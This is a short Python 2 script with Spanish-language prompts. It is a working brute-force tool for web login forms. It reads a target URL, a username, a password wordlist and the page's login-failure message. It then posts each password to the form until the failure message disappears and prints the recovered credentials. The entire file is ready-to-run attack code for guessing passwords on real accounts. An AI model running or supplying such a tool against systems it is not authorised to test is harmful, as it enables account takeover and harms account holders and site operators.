
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
import requests
from termcolor import colored

url = raw_input('[+] Ingresa la Url: ')
username = raw_input('[+] Ingresa el Username Para Realizar la Fuerza Bruta: ')
password_file = raw_input('[+] Ingresa el achivo con contrasenas: ')
login_failed_string = raw_input('[+] Ingresa el log de error de la pagina al se autenticado: ')


def cracking(username,url):
	for password in passwords:
		password = password.strip()
		print(colored(('Trying: ' + password), 'red'))
		data = {'username':username,'password':password,'Login':'submit'}
		response = requests.post(url, data=data)
		if login_failed_string in response.content.decode():
			pass
		else:
			print(colored(('[+] Found Username: ==> ' + username), 'green'))
			print(colored(('[+] Found Password: ==> ' + password), 'green'))
			exit()




with open(password_file, 'r') as passwords:
	cracking(username,url)

print('[!!] Password Not In List')


